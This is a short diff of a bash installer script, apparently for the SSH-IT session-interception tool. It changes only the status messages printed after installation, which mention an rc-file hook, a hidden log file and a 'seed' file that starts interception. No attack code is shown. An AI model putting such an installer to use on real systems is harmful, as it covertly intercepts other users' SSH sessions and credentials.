@@ -207,8 +207,8 @@ if [[ -n $THC_LOCAL ]]; then
 	echo -e 2>&1 ""\
 "--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.\n"\
 "--> Logging to ${CY}${THC_BASEDIR}/.l${CN}\n"\
-"--> Type ${CM}${THC_BASEDIR}/thc_cli uninstall${CN} to remove.\n"\
-"--> Intercepting will start on next log in or to start right\n"\
+"--> Type ${CM}${THC_BASEDIR}/thc_cli -r uninstall${CN} to remove.\n"\
+"--> SSH-IT will start on next log in or to start right\n"\
 "    now type ${CM}source ${THC_BASEDIR}/seed${CN}."
 fi
 
